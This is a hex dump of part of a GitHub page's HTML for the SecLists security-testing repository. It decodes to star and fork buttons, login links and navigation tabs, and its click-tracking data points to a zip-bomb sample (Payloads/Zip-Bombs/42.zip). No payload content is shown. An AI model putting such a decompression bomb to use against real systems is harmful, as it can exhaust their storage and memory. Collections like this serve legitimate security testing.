0008370 7265 2073 7261 2065 6177 6374 6968 676e
0008380 7420 6968 2073 6572 6f70 6973 6f74 7972
0008390 3e22 200a 2020 2020 3120 342c 3630 200a
00083a0 2020 3c20 612f 0a3e 200a 3c20 6c2f 3e69
00083b0 0a0a 2020 6c3c 3e69 200a 2020 2020 2020
00083c0 3c20 2061 6c63 7361 3d73 6222 6e74 6220
00083d0 6e74 732d 206d 7462 2d6e 6977 6874 632d
00083e0 756f 746e 7420 6f6f 746c 7069 6570 2064
00083f0 6f74 6c6f 6974 7070 6465 732d 2022 7261
0008400 6169 6c2d 6261 6c65 223d 6f59 2075 756d
0008410 7473 6220 2065 6973 6e67 6465 6920 206e
0008420 6f74 7320 6174 2072 2061 6572 6f70 6973
0008430 6f74 7972 2022 6572 3d6c 6e22 666f 6c6f
0008440 6f6c 2277 6420 7461 2d61 7968 7264 2d6f
0008450 6c63 6369 3d6b 7b22 7126 6f75 3b74 7665
0008460 6e65 5f74 7974 6570 7126 6f75 3b74 263a
0008470 7571 746f 613b 7475 6568 746e 6369 7461
0008480 6f69 2e6e 6c63 6369 266b 7571 746f 2c3b
0008490 7126 6f75 3b74 6170 6c79 616f 2664 7571
00084a0 746f 3a3b 267b 7571 746f 6c3b 636f 7461
00084b0 6f69 5f6e 6e69 705f 6761 2665 7571 746f
00084c0 3a3b 7126 6f75 3b74 7473 7261 6220 7475
00084d0 6f74 266e 7571 746f 2c3b 7126 6f75 3b74
00084e0 6572 6f70 6973 6f74 7972 695f 2664 7571
00084f0 746f 3a3b 3433 3238 3835 2c38 7126 6f75
0008500 3b74 7561 6874 745f 7079 2665 7571 746f
0008510 3a3b 7126 6f75 3b74 4f4c 5f47 4e49 7126
0008520 6f75 3b74 262c 7571 746f 633b 696c 6e65
0008530 5f74 6469 7126 6f75 3b74 6e3a 6c75 2c6c
0008540 7126 6f75 3b74 726f 6769 6e69 7461 6e69
0008550 5f67 6572 7571 7365 5f74 6469 7126 6f75
0008560 3b74 263a 7571 746f 433b 3741 3a37 3837
0008570 3445 343a 3530 3130 3a31 4336 3631 3246
0008580 353a 4343 4543 3742 2646 7571 746f 2c3b
0008590 7126 6f75 3b74 726f 6769 6e69 7461 6e69
00085a0 5f67 7275 266c 7571 746f 3a3b 7126 6f75
00085b0 3b74 7468 7074 3a73 2f2f 6967 6874 6275
00085c0 632e 6d6f 642f 6e61 6569 6d6c 6569 7373
00085d0 656c 2f72 6553 4c63 7369 7374 622f 6f6c
00085e0 2f62 616d 7473 7265 502f 7961 6f6c 6461
00085f0 2f73 695a 2d70 6f42 626d 2f73 3234 7a2e
0008600 7069 7126 6f75 3b74 262c 7571 746f 723b
0008610 6665 7265 6572 2672 7571 746f 3a3b 756e
0008620 6c6c 262c 7571 746f 753b 6573 5f72 6469
0008630 7126 6f75 3b74 6e3a 6c75 7d6c 227d 6420
0008640 7461 2d61 7968 7264 2d6f 6c63 6369 2d6b
0008650 6d68 6361 223d 3633 6166 6630 3666 3535
0008660 3361 3963 3231 6239 3035 6165 6635 6361
0008670 6339 3465 6532 6639 3235 3162 3630 6165
0008680 6162 6135 3466 3164 6330 6135 3239 6435
0008690 3661 6231 6262 2022 7268 6665 223d 6c2f
00086a0 676f 6e69 723f 7465 7275 5f6e 6f74 253d
00086b0 4632 6164 696e 6c65 696d 7365 6c73 7265
00086c0 3225 5346 6365 694c 7473 2273 0a3e 2020
00086d0 2020 2020 733c 6776 6320 616c 7373 223d
00086e0 636f 6974 6f63 206e 636f 6974 6f63 2d6e
00086f0 7473 7261 7620 612d 696c 6e67 742d 7865
0008700 2d74 6f62 7474 6d6f 2022 6976 7765 6f42
0008710 3d78 3022 3020 3120 2034 3631 2022 6576
0008720 7372 6f69 3d6e 3122 312e 2022 6977 7464
0008730 3d68 3122 2234 6820 6965 6867 3d74 3122
0008740 2236 6120 6972 2d61 6968 6464 6e65 223d
0008750 7274 6575 3e22 703c 7461 2068 6966 6c6c
0008760 722d 6c75 3d65 6522 6576 6f6e 6464 2022
0008770 3d64 4d22 3431 3620 2d6c 2e34 2d39 362e
0008780 4c34 2037 2031 2e34 2039 2e35 3633 3020
0008790 3620 336c 362e 3320 322e 4c36 2e32 3736
00087a0 3120 2034 2037 3131 362e 2037 3131 332e
00087b0 2033 3431 2d6c 392e 2d33 2e34 3437 314c
00087c0 2034 7a36 2f22 3c3e 732f 6776 0a3e 2020
00087d0 2020 2020 7453 7261 3c0a 612f 0a3e 2020
00087e0 2020 613c 6320 616c 7373 223d 6f73 6963
00087f0 6c61 632d 756f 746e 6a20 2d73 6f73 6963
0008800 6c61 632d 756f 746e 2022 7268 6665 223d
0008810 642f 6e61 6569 6d6c 6569 7373 656c 2f72
0008820 6553 4c63 7369 7374 732f 6174 6772 7a61
0008830 7265 2273 200a 2020 2020 6120 6972 2d61
0008840 616c 6562 3d6c 3122 3937 3739 7520 6573
0008850 7372 7320 6174 7272 6465 7420 6968 2073
0008860 6572 6f70 6973 6f74 7972 3e22 200a 2020
0008870 2020 3120 2c37 3939 0a37 2020 2020 2f3c
0008880 3e61 0a0a 2020 2f3c 696c 0a3e 200a 3c20
0008890 696c 0a3e 2020 2020 2020 613c 6320 616c
00088a0 7373 223d 7462 206e 7462 2d6e 6d73 6220
00088b0 6e74 772d 7469 2d68 6f63 6e75 2074 6f74
00088c0 6c6f 6974 7070 6465 7420 6f6f 746c 7069
00088d0 6570 2d64 2273 6120 6972 2d61 616c 6562
00088e0 3d6c 5922 756f 6d20 7375 2074 6562 7320
00088f0 6769 656e 2064 6e69 7420 206f 6f66 6b72
0008900 6120 7220 7065 736f 7469 726f 2279 7220
0008910 6c65 223d 6f6e 6f66 6c6c 776f 2022 6164
0008920 6174 682d 6479 6f72 632d 696c 6b63 223d
0008930 267b 7571 746f 653b 6576 746e 745f 7079
0008940 2665 7571 746f 3a3b 7126 6f75 3b74 7561
0008950 6874 6e65 6974 6163 6974 6e6f 632e 696c
0008960 6b63 7126 6f75 3b74 262c 7571 746f 703b
0008970 7961 6f6c 6461 7126 6f75 3b74 7b3a 7126
0008980 6f75 3b74 6f6c 6163 6974 6e6f 695f 5f6e
0008990 6170 6567 7126 6f75 3b74 263a 7571 746f
00089a0 723b 7065 206f 6564 6174 6c69 2073 6f66
00089b0 6b72 6220 7475 6f74 266e 7571 746f 2c3b
00089c0 7126 6f75 3b74 6572 6f70 6973 6f74 7972
00089d0 695f 2664 7571 746f 3a3b 3433 3238 3835
00089e0 2c38 7126 6f75 3b74 7561 6874 745f 7079
00089f0 2665 7571 746f 3a3b 7126 6f75 3b74 4f4c
0008a00 5f47 4e49 7126 6f75 3b74 262c 7571 746f
0008a10 633b 696c 6e65 5f74 6469 7126 6f75 3b74
0008a20 6e3a 6c75 2c6c 7126 6f75 3b74 726f 6769
0008a30 6e69 7461 6e69 5f67 6572 7571 7365 5f74
0008a40 6469 7126 6f75 3b74 263a 7571 746f 433b
0008a50 3741 3a37 3837 3445 343a 3530 3130 3a31
0008a60 4336 3631 3246 353a 4343 4543 3742 2646
0008a70 7571 746f 2c3b 7126 6f75 3b74 726f 6769
0008a80 6e69 7461 6e69 5f67 7275 266c 7571 746f
0008a90 3a3b 7126 6f75 3b74 7468 7074 3a73 2f2f
0008aa0 6967 6874 6275 632e 6d6f 642f 6e61 6569
0008ab0 6d6c 6569 7373 656c 2f72 6553 4c63 7369
0008ac0 7374 622f 6f6c 2f62 616d 7473 7265 502f
0008ad0 7961 6f6c 6461 2f73 695a 2d70 6f42 626d
0008ae0 2f73 3234 7a2e 7069 7126 6f75 3b74 262c
0008af0 7571 746f 723b 6665 7265 6572 2672 7571
0008b00 746f 3a3b 756e 6c6c 262c 7571 746f 753b
0008b10 6573 5f72 6469 7126 6f75 3b74 6e3a 6c75
0008b20 7d6c 227d 6420 7461 2d61 7968 7264 2d6f
0008b30 6c63 6369 2d6b 6d68 6361 223d 3734 3731
0008b40 3436 3762 6366 3039 6132 3863 6161 3930
0008b50 6134 3738 3133 6639 3864 3134 3031 3131
0008b60 6236 3337 3338 6139 3733 6437 6461 3066
0008b70 3337 3165 3333 6166 3561 3436 2022 7268
0008b80 6665 223d 6c2f 676f 6e69 723f 7465 7275
0008b90 5f6e 6f74 253d 4632 6164 696e 6c65 696d
0008ba0 7365 6c73 7265 3225 5346 6365 694c 7473
0008bb0 2273 0a3e 2020 2020 2020 2020 733c 6776
0008bc0 6320 616c 7373 223d 636f 6974 6f63 206e
0008bd0 636f 6974 6f63 2d6e 6572 6f70 662d 726f
0008be0 656b 2064 2d76 6c61 6769 2d6e 6574 7478
0008bf0 622d 746f 6f74 226d 7620 6569 4277 786f
0008c00 223d 2030 2030 3031 3120 2236 7620 7265
0008c10 6973 6e6f 223d 2e31 2231 7720 6469 6874
0008c20 223d 3031 2022 6568 6769 7468 223d 3631
0008c30 2022 7261 6169 682d 6469 6564 3d6e 7422
0008c40 7572 2265 3c3e 6170 6874 6620 6c69 2d6c
0008c50 7572 656c 223d 7665 6e65 646f 2264 6420
0008c60 223d 384d 3120 3161 392e 3339 3120 392e
0008c70 3339 3020 3020 3020 312d 3320 372e 5632
0008c80 4c36 2035 2038 2033 5636 2e34 3237 3141
0008c90 392e 3339 3120 392e 3339 3020 3020 3020
0008ca0 3220 3120 3161 392e 3339 3120 392e 3339
0008cb0 3020 3020 3020 312d 3320 372e 5632 2e36
0008cc0 6c35 2033 7633 2e31 3837 3141 392e 3339
0008cd0 3120 392e 3339 3020 3020 3020 3520 3120
0008ce0 6135 2e31 3939 2033 2e31 3939 2033 2030
0008cf0 2030 2030 2d31 2e33 3237 3956 352e 336c
0008d00 332d 3456 372e 4132 2e31 3939 2033 2e31
0008d10 3939 2033 2030 2030 2030 2038 7a31 324d
0008d20 3420 322e 3143 332e 2034 2e34 2e32 2038
0008d30 2e33 3536 382e 3320 3063 2e2d 3536 352e
0008d40 2d35 2e31 2032 2e31 2d32 2e31 2e32 3536
0008d50 3020 3120 322e 352e 2035 2e31 2032 2e31
0008d60 2032 2030 362e 2d35 352e 2035 2e31 2d32
0008d70 2e31 2032 2e31 7a32 336d 3120 6330 2e2d
0008d80 3636 3020 312d 322e 2e2d 3535 312d 322e
0008d90 312d 322e 3020 2e2d 3536 352e 2d35 2e31
0008da0 2032 2e31 2d32 2e31 2e32 3536 3020 3120
0008db0 322e 352e 2035 2e31 2032 2e31 2032 2030
0008dc0 362e 2d35 352e 2035 2e31 2d32 2e31 2032
0008dd0 2e31 7a32 336d 312d 6330 2e2d 3636 3020
0008de0 312d 322e 2e2d 3535 312d 322e 312d 322e
0008df0 3020 2e2d 3536 352e 2d35 2e31 2032 2e31
0008e00 2d32 2e31 2e32 3536 3020 3120 322e 352e
0008e10 2035 2e31 2032 2e31 2032 2030 362e 2d35
0008e20 352e 2035 2e31 2d32 2e31 2032 2e31 7a32
0008e30 2f22 3c3e 732f 6776 0a3e 2020 2020 2020
0008e40 2020 6f46 6b72 3c0a 612f 0a3e 2020 2020
0008e50 613c 6820 6572 3d66 2f22 6164 696e 6c65
0008e60 696d 7365 6c73 7265 532f 6365 694c 7473
0008e70 2f73 656e 7774 726f 2f6b 656d 626d 7265
0008e80 2273 6320 616c 7373 223d 6f73 6963 6c61
0008e90 632d 756f 746e 0a22 2020 2020 2020 6120
0008ea0 6972 2d61 616c 6562 3d6c 3622 3338 2031
0008eb0 7375 7265 2073 6f66 6b72 6465 7420 6968
0008ec0 2073 6572 6f70 6973 6f74 7972 3e22 200a
0008ed0 2020 2020 3620 382c 3133 200a 2020 3c20
0008ee0 612f 0a3e 2020 2f3c 696c 0a3e 2f3c 6c75
0008ef0 0a3e 200a 2020 2020 3c20 3168 6320 616c
0008f00 7373 223d 7570 6c62 6369 2220 0a3e 2020
0008f10 2020 733c 6776 6320 616c 7373 223d 636f
0008f20 6974 6f63 206e 636f 6974 6f63 2d6e 6572
0008f30 6f70 2022 6976 7765 6f42 3d78 3022 3020
0008f40 3120 2032 3631 2022 6576 7372 6f69 3d6e
0008f50 3122 312e 2022 6977 7464 3d68 3122 2232
0008f60 6820 6965 6867 3d74 3122 2236 6120 6972
0008f70 2d61 6968 6464 6e65 223d 7274 6575 3e22
0008f80 703c 7461 2068 6966 6c6c 722d 6c75 3d65
0008f90 6522 6576 6f6e 6464 2022 3d64 4d22 2034
0008fa0 4839 5633 6838 7631 7a31 306d 332d 3348
0008fb0 3176 3168 3656 6d7a 2d30 4832 7633 6831
0008fc0 5631 7a34 306d 322d 3348 3176 3168 3256
0008fd0 6d7a 2d38 7631 3231 3063 2e20 3535 2e2d
0008fe0 3534 3120 312d 3120 3648 3276 2d6c 2e31
0008ff0 2d35 2e31 4c35 2033 3631 2d76 4832 6331
0009000 2e2d 3535 3020 312d 2e2d 3534 312d 312d
0009010 3156 3063 2e2d 3535 342e 2d35 2031 2d31
0009020 6831 3031 2e63 3535 3020 3120 2e20 3534
0009030 3120 3120 6d7a 312d 3120 4830 7631 6832
0009040 7632 312d 3368 3176 3568 2d76 7a32 306d
0009050 312d 4830 7632 6839 5639 7a31 2f22 3c3e
0009060 732f 6776 0a3e 2020 733c 6170 206e 6c63
0009070 7361 3d73 6122 7475 6f68 2272 6920 6574
0009080 706d 6f72 3d70 6122 7475 6f68 2272 3c3e
0009090 2061 6c63 7361 3d73 7522 6c72 6620 226e
00090a0 7220 6c65 223d 7561 6874 726f 2022 6164
00090b0 6174 682d 766f 7265 6163 6472 742d 7079
00090c0 3d65 7522 6573 2272 6420 7461 2d61 6f68
00090d0 6576 6372 7261 2d64 7275 3d6c 2f22 6f68
00090e0 6576 6372 7261 7364 753f 6573 5f72 6469
00090f0 353d 3630 3435 2022 6164 6174 6f2d 7463
0009100 2d6f 6c63 6369 3d6b 6822 766f 7265 6163
0009110 6472 6c2d 6e69 2d6b 6c63 6369 226b 6420
0009120 7461 2d61 636f 6f74 642d 6d69 6e65 6973
0009130 6e6f 3d73 6c22 6e69 5f6b 7974 6570 733a
0009140 6c65 2266 6820 6572 3d66 2f22 6164 696e
0009150 6c65 696d 7365 6c73 7265 3e22 6164 696e
0009160 6c65 696d 7365 6c73 7265 2f3c 3e61 2f3c
0009170 7073 6e61 3c3e 2d21 0a2d 2d2d 3c3e 7073
0009180 6e61 6320 616c 7373 223d 6170 6874 642d
0009190 7669 6469 7265 3e22 3c2f 732f 6170 3e6e
00091a0 213c 2d2d 2d0a 3e2d 733c 7274 6e6f 2067
00091b0 7469 6d65 7270 706f 223d 616e 656d 3e22
00091c0 613c 6420 7461 2d61 6a70 7861 223d 6a23
00091d0 2d73 6572 6f70 702d 616a 2d78 6f63 746e
00091e0 6961 656e 2272 6820 6572 3d66 2f22 6164
00091f0 696e 6c65 696d 7365 6c73 7265 532f 6365
0009200 694c 7473 2273 533e 6365 694c 7473 3c73
0009210 612f 3c3e 732f 7274 6e6f 3e67 200a 0a20
0009220 3c0a 682f 3e31 0a0a 2020 2020 2f3c 6964
0009230 3e76 200a 2020 0a20 6e3c 7661 6320 616c
0009240 7373 223d 6572 6f70 616e 2076 736a 722d
0009250 7065 2d6f 616e 2076 736a 732d 6469 6e65
0009260 7661 632d 6e6f 6174 6e69 7265 702d 616a
0009270 2078 6f63 746e 6961 656e 2272 200a 2020
0009280 2020 7469 6d65 6373 706f 0a65 2020 2020
0009290 6920 6574 746d 7079 3d65 6822 7474 3a70
00092a0 2f2f 6373 6568 616d 6f2e 6772 422f 6572
00092b0 6461 7263 6d75 4c62 7369 2274 200a 2020
00092c0 6120 6972 2d61 616c 6562 3d6c 5222 7065
00092d0 736f 7469 726f 2279 200a 2020 2020 6164
00092e0 6174 702d 616a 3d78 2322 736a 722d 7065
00092f0 2d6f 6a70 7861 632d 6e6f 6174 6e69 7265
0009300 3e22 0a0a 2020 733c 6170 206e 7469 6d65
0009310 6373 706f 2065 7469 6d65 7974 6570 223d
0009320 7468 7074 2f3a 732f 6863 6d65 2e61 726f
0009330 2f67 694c 7473 7449 6d65 2022 7469 6d65
0009340 7270 706f 223d 7469 6d65 694c 7473 6c45
0009350 6d65 6e65 2274 0a3e 2020 2020 613c 6320
0009360 616c 7373 223d 736a 732d 6c65 6365 6574
0009370 2d64 616e 6976 6167 6974 6e6f 692d 6574
0009380 206d 6573 656c 7463 6465 7220 7065 6e6f
0009390 7661 692d 6574 226d 6920 6574 706d 6f72
00093a0 3d70 7522 6c72 2022 6164 6174 682d 746f
00093b0 656b 3d79 6722 6320 2022 7261 6169 632d
00093c0 7275 6572 746e 223d 6170 6567 2022 6164
00093d0 6174 732d 6c65 6365 6574 2d64 696c 6b6e
00093e0 3d73 7222 7065 5f6f 6f73 7275 6563 7220
00093f0 7065 5f6f 6f64 6e77 6f6c 6461 2073 6572
0009400 6f70 635f 6d6f 696d 7374 7220 7065 5f6f
0009410 6572 656c 7361 7365 7220 7065 5f6f 6174
0009420 7367 7220 7065 5f6f 7262 6e61 6863 7365
0009430 7220 7065 5f6f 6170 6b63 6761 7365 2f20
0009440 6164 696e 6c65 696d 7365 6c73 7265 532f
0009450 6365 694c 7473 2273 6820 6572 3d66 2f22
0009460 6164 696e 6c65 696d 7365 6c73 7265 532f
0009470 6365 694c 7473 2273 0a3e 2020 2020 2020
0009480 733c 6776 6320 616c 7373 223d 636f 6974
0009490 6f63 206e 636f 6974 6f63 2d6e 6f63 6564
00094a0 2022 6976 7765 6f42 3d78 3022 3020 3120
00094b0 2034 3631 2022 6576 7372 6f69 3d6e 3122
00094c0 312e 2022 6977 7464 3d68 3122 2234 6820
00094d0 6965 6867 3d74 3122 2236 6120 6972 2d61
00094e0 6968 6464 6e65 223d 7274 6575 3e22 703c
00094f0 7461 2068 6966 6c6c 722d 6c75 3d65 6522
0009500 6576 6f6e 6464 2022 3d64 4d22 2e39 2035
0009510 4c33 2038 2e34 2035 3131 352e 3820 3820
0009520 3120 2e31 2035 2e39 2035 3331 3120 2034
0009530 2038 2e39 2035 7a33 2d6d 2035 4c30 2030
0009540 6c38 2e34 2035 4c35 2036 3131 352e 3220
0009550 352e 3820 3620 3420 352e 3420 352e 3320
0009560 227a 3e2f 2f3c 7673 3e67 200a 2020 2020
0009570 3c20 7073 6e61 6920 6574 706d 6f72 3d70
0009580 6e22 6d61 2265 433e 646f 3c65 732f 6170
0009590 3e6e 200a 2020 2020 3c20 656d 6174 6920
00095a0 6574 706d 6f72 3d70 7022 736f 7469 6f69
00095b0 226e 6320 6e6f 6574 746e 223d 2231 0a3e
00095c0 2f3c 3e61 2020 2f3c 7073 6e61 0a3e 200a
00095d0 2020 3c20 7073 6e61 6920 6574 736d 6f63
00095e0 6570 6920 6574 746d 7079 3d65 6822 7474
00095f0 3a70 2f2f 6373 6568 616d 6f2e 6772 4c2f
0009600 7369 4974 6574 226d 6920 6574 706d 6f72
0009610 3d70 6922 6574 4c6d 7369 4574 656c 656d
0009620 746e 3e22 200a 2020 2020 3c20 2061 7469
0009630 6d65 7270 706f 223d 7275 226c 6420 7461
0009640 2d61 6f68 6b74 7965 223d 2067 2269 6320
0009650 616c 7373 223d 736a 732d 6c65 6365 6574
0009660 2d64 616e 6976 6167 6974 6e6f 692d 6574
0009670 206d 6572 6f70 616e 2d76 7469 6d65 2022
0009680 6164 6174 732d 6c65 6365 6574 2d64 696c
0009690 6b6e 3d73 7222 7065 5f6f 7369 7573 7365
00096a0 7220 7065 5f6f 616c 6562 736c 7220 7065
00096b0 5f6f 696d 656c 7473 6e6f 7365 2f20 6164
00096c0 696e 6c65 696d 7365 6c73 7265 532f 6365
00096d0 694c 7473 2f73 7369 7573 7365 2022 7268
00096e0 6665 223d 642f 6e61 6569 6d6c 6569 7373
00096f0 656c 2f72 6553 4c63 7369 7374 692f 7373
0009700 6575 2273 0a3e 2020 2020 2020 2020 733c
0009710 6776 6320 616c 7373 223d 636f 6974 6f63
0009720 206e 636f 6974 6f63 2d6e 7369 7573 2d65
0009730 706f 6e65 6465 2022 6976 7765 6f42 3d78
0009740 3022 3020 3120 2034 3631 2022 6576 7372
0009750 6f69 3d6e 3122 312e 2022 6977 7464 3d68
0009760 3122 2234 6820 6965 6867 3d74 3122 2236
0009770 6120 6972 2d61 6968 6464 6e65 223d 7274
0009780 6575 3e22 703c 7461 2068 6966 6c6c 722d
0009790 6c75 3d65 6522 6576 6f6e 6464 2022 3d64
00097a0 4d22 2037 2e32 6333 2e33 3431 3020 3520
00097b0 372e 3220 352e 2036 2e35 2037 2e35 7337
00097c0 322d 352e 2036 2e35 2d37 2e35 2037 2e35
00097d0 4137 2e35 3137 3520 372e 2031 2030 2030
00097e0 2031 2e31 2033 6338 2d30 2e33 3431 3220
00097f0 352e 2d36 2e35 2037 2e35 2d37 2e35 7a37
0009800 374d 3120 3343 312e 2034 2031 2030 2e34
0009810 3431 3020 3820 3373 312e 2034 2037 2037
0009820 2037 2d37 2e33 3431 3720 372d 332d 312e
0009830 2d34 2d37 2d37 7a37 316d 3320 3648 3576
0009840 3268 3456 6d7a 2030 4836 7636 6832 7632
0009850 322d 227a 3e2f 2f3c 7673 3e67 200a 2020
0009860 2020 2020 3c20 7073 6e61 6920 6574 706d
0009870 6f72 3d70 6e22 6d61 2265 493e 7373 6575
0009880 3c73 732f 6170 3e6e 200a 2020 2020 2020
0009890 3c20 7073 6e61 6320 616c 7373 223d 6f43
00098a0 6e75 6574 2272 383e 2f3c 7073 6e61 0a3e
00098b0 2020 2020 2020 2020 6d3c 7465 2061 7469
00098c0 6d65 7270 706f 223d 6f70 6973 6974 6e6f
00098d0 2022 6f63 746e 6e65 3d74 3222 3e22 3c0a
00098e0 612f 203e 2020 3c20 732f 6170 3e6e 0a0a
00098f0 2020 733c 6170 206e 7469 6d65 6373 706f
0009900 2065 7469 6d65 7974 6570 223d 7468 7074
0009910 2f3a 732f 6863 6d65 2e61 726f 2f67 694c
0009920 7473 7449 6d65 2022 7469 6d65 7270 706f
0009930 223d 7469 6d65 694c 7473 6c45 6d65 6e65
0009940 2274 0a3e 2020 2020 613c 6420 7461 2d61
0009950 6f68 6b74 7965 223d 2067 2270 6920 6574
0009960 706d 6f72 3d70 7522 6c72 2022 6c63 7361
0009970 3d73 6a22 2d73 6573 656c 7463 6465 6e2d
0009980 7661 6769 7461 6f69 2d6e 7469 6d65 7220
0009990 7065 6e6f 7661 692d 6574 226d 6420 7461
00099a0 2d61 6573 656c 7463 6465 6c2d 6e69 736b
00099b0 223d 6572 6f70 705f 6c75 736c 6320 6568
00099c0 6b63 2073 642f 6e61 6569 6d6c 6569 7373
00099d0 656c 2f72 6553 4c63 7369 7374 702f 6c75
00099e0 736c 2022 7268 6665 223d 642f 6e61 6569
00099f0 6d6c 6569 7373 656c 2f72 6553 4c63 7369
0009a00 7374 702f 6c75 736c 3e22 200a 2020 2020
0009a10 3c20 7673 2067 6c63 7361 3d73 6f22 7463
0009a20 6369 6e6f 6f20 7463 6369 6e6f 672d 7469
0009a30 702d 6c75 2d6c 6572 7571 7365 2274 7620
0009a40 6569 4277 786f 223d 2030 2030 3231 3120
0009a50 2236 7620 7265 6973 6e6f 223d 2e31 2231
0009a60 7720 6469 6874 223d 3231 2022 6568 6769
0009a70 7468 223d 3631 2022 7261 6169 682d 6469
0009a80 6564 3d6e 7422 7572 2265 3c3e 6170 6874
0009a90 6620 6c69 2d6c 7572 656c 223d 7665 6e65
0009aa0 646f 2264 6420 223d 314d 2031 3131 322e
0009ab0 5638 6335 2e2d 3330 2e2d 3837 2e2d 3433
0009ac0 312d 342e 2d37 392e 2d34 2e32 3630 3943
0009ad0 342e 2036 2e32 3533 3820 372e 2038 2e32
0009ae0 3330 3820 3220 3748 3056 344c 3320 336c
0009af0 3320 3456 3168 2e63 3732 302e 2e32 3834
0009b00 312e 2e31 3936 332e 2e31 3132 322e 332e
0009b10 342e 2e32 3133 362e 7639 2e36 3832 3141
0009b20 392e 3339 3120 392e 3339 3020 3020 3020
0009b30 3120 2030 3531 3161 392e 3339 3120 392e
0009b40 3339 3020 3020 3020 3120 332d 372e 7a32
0009b50 2d6d 2031 2e32 3239 2d63 362e 2036 2d30
0009b60 2e31 2d32 352e 2d35 2e31 2d32 2e31 2032
0009b70 2d30 362e 2e35 3535 312d 322e 3120 322e
0009b80 312d 322e 362e 2035 2030 2e31 2e32 3535
0009b90 3120 322e 3120 322e 3020 2e20 3536 2e2d
0009ba0 3535 3120 322e 312d 322e 3120 322e 4d7a
0009bb0 2034 6333 2d30 2e31 3131 2e2d 3938 322d
0009bc0 322d 322d 3161 392e 3339 3120 392e 3339
0009bd0 3020 3020 3020 312d 3320 372e 7632 2e36
0009be0 3635 3141 392e 3339 3120 392e 3339 3020
0009bf0 3020 3020 3220 3120 6135 2e31 3939 2033
0009c00 2e31 3939 2033 2030 2030 2030 2d31 2e33
0009c10 3237 3456 372e 6332 352e 2d39 332e 2034
0009c20 2d31 392e 2038 2d31 2e31 3237 6d7a 2e2d
0009c30 2038 3031 3063 2e20 3636 2e2d 3535 3120
0009c40 322e 312d 322e 3120 322e 2e2d 3536 3020
0009c50 312d 322e 2e2d 3535 312d 322e 312d 322e
0009c60 3020 2e2d 3536 352e 2d35 2e31 2032 2e31
0009c70 2d32 2e31 2e32 3536 3020 3120 322e 352e
0009c80 2035 2e31 2032 2e31 7a32 324d 3420 322e
0009c90 3143 332e 2034 2e34 2e32 2038 2e33 3536
0009ca0 382e 3320 3063 2e2d 3536 352e 2d35 2e31
0009cb0 2032 2e31 2d32 2e31 2e32 3536 3020 3120
0009cc0 322e 352e 2035 2e31 2032 2e31 2032 2030
0009cd0 362e 2d35 352e 2035 2e31 2d32 2e31 2032
0009ce0 2e31 7a32 2f22 3c3e 732f 6776 0a3e 2020
0009cf0 2020 2020 733c 6170 206e 7469 6d65 7270
0009d00 706f 223d 616e 656d 3e22 7550 6c6c 7220
0009d10 7165 6575 7473 3c73 732f 6170 3e6e 200a
0009d20 2020 2020 3c20 7073 6e61 6320 616c 7373
0009d30 223d 6f43 6e75 6574 2272 313e 2f3c 7073
0009d40 6e61 0a3e 2020 2020 2020 6d3c 7465 2061
0009d50 7469 6d65 7270 706f 223d 6f70 6973 6974
0009d60 6e6f 2022 6f63 746e 6e65 3d74 3322 3e22
0009d70 3c0a 612f 203e 3c20 732f 6170 3e6e 0a0a
0009d80 0a0a 2020 2020 613c 6420 7461 2d61 6f68
0009d90 6b74 7965 223d 2067 2262 6320 616c 7373
0009da0 223d 736a 732d 6c65 6365 6574 2d64 616e
0009db0 6976 6167 6974 6e6f 692d 6574 206d 6572
0009dc0 6f70 616e 2d76 7469 6d65 2022 6164 6174
0009dd0 732d 6c65 6365 6574 2d64 696c 6b6e 3d73
0009de0 7222 7065 5f6f 7270 6a6f 6365 7374 6e20
0009df0 7765 725f 7065 5f6f 7270 6a6f 6365 2074
0009e00 6572 6f70 705f 6f72 656a 7463 2f20 6164
0009e10 696e 6c65 696d 7365 6c73 7265 532f 6365
0009e20 694c 7473 2f73 7270 6a6f 6365 7374 2022
0009e30 7268 6665 223d 642f 6e61 6569 6d6c 6569
0009e40 7373 656c 2f72 6553 4c63 7369 7374 702f
0009e50 6f72 656a 7463 2273 0a3e 2020 2020 2020
0009e60 733c 6776 6320 616c 7373 223d 636f 6974
0009e70 6f63 206e 636f 6974 6f63 2d6e 7270 6a6f
0009e80 6365 2274 7620 6569 4277 786f 223d 2030
0009e90 2030 3531 3120 2236 7620 7265 6973 6e6f
0009ea0 223d 2e31 2231 7720 6469 6874 223d 3531
0009eb0 2022 6568 6769 7468 223d 3631 2022 7261
0009ec0 6169 682d 6469 6564 3d6e 7422 7572 2265
0009ed0 3c3e 6170 6874 6620 6c69 2d6c 7572 656c
0009ee0 223d 7665 6e65 646f 2264 6420 223d 314d
0009ef0 2030 3231 3368 3256 2d68 7633 3031 6d7a
0009f00 342d 322d 3368 3256 3648 3876 6d7a 342d
0009f10 3420 3368 3256 3248 3176 7a32 2d6d 2031
0009f20 6831 3331 3156 3148 3176 7a34 314d 2034
0009f30 4830 6131 2031 2031 2030 2030 2d30 2031
0009f40 7631 3431 3161 3120 3020 3020 3020 3120
0009f50 3120 3168 6133 2031 2031 2030 2030 2030
0009f60 2d31 5631 6131 2031 2031 2030 2030 2d30
0009f70 2d31 7a31 2f22 3c3e 732f 6776 0a3e 2020
0009f80 2020 2020 7250 6a6f 6365 7374 200a 2020
0009f90 2020 3c20 7073 6e61 6320 616c 7373 223d
0009fa0 6f43 6e75 6574 2272 3e20 3c30 732f 6170
0009fb0 3e6e 3c0a 612f 0a3e 200a 2020 3c20 2061
0009fc0 6c63 7361 3d73 6a22 2d73 6573 656c 7463
0009fd0 6465 6e2d 7661 6769 7461 6f69 2d6e 7469
0009fe0 6d65 7220 7065 6e6f 7661 692d 6574 226d
0009ff0 6420 7461 2d61 6f68 6b74 7965 223d 2067
000a000 2277 6420 7461 2d61 6573 656c 7463 6465
000a010 6c2d 6e69 736b 223d 6572 6f70 775f 6b69
000a020 2069 642f 6e61 6569 6d6c 6569 7373 656c
000a030 2f72 6553 4c63 7369 7374 772f 6b69 2269
000a040 6820 6572 3d66 2f22 6164 696e 6c65 696d
000a050 7365 6c73 7265 532f 6365 694c 7473 2f73
000a060 6977 696b 3e22 200a 2020 2020 3c20 7673
000a070 2067 6c63 7361 3d73 6f22 7463 6369 6e6f
000a080 6f20 7463 6369 6e6f 622d 6f6f 226b 7620
000a090 6569 4277 786f 223d 2030 2030 3631 3120
000a0a0 2236 7620 7265 6973 6e6f 223d 2e31 2231
000a0b0 7720 6469 6874 223d 3631 2022 6568 6769
000a0c0 7468 223d 3631 2022 7261 6169 682d 6469
000a0d0 6564 3d6e 7422 7572 2265 3c3e 6170 6874
000a0e0 6620 6c69 2d6c 7572 656c 223d 7665 6e65
000a0f0 646f 2264 6420 223d 334d 3520 3468 3176
